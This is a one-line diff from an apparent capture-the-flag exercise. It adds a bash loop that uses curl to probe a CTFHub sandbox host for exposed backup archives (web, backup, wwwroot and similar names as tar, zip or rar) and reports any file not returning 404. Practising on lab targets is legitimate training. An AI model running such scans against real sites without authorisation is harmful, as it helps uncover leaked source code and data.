@@ -1,0 +1,1 @@
+for name in web website backup back www wwwroot temp; do for ext in tar tar.gz zip rar; do code=$(curl -s -o /dev/null -w "%{http_code}" "http://challenge-a26ef191085184e6.sandbox.ctfhub.com:10800/${name}.${ext}"); if [ "$code" != "404" ]; then echo "[+] ${name}.${ext} → HTTP $code"; fi; done; done
